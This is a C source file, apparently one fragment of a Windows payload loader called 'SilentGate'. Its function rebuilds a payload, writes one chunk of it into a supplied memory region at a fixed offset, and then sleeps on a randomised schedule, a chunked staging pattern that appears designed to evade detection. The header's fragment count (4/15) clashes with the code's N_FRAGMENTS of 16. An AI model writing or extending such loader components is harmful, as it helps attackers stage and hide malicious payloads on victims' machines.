/*
 * SilentGate Fragment 4/15
 * Offset: 30436 bytes  Size: 7609 bytes
 * Schedule: t=374ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   4
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  121746
#define CHUNK_OFFSET  30436
#define CHUNK_SIZE    7609
#define SLEEP_NEXT_MS 374

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 4: Write chunk 4 */
void sg_execute_fragment_4(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 4] Writing chunk at t=374ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 4] Chunk 4 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
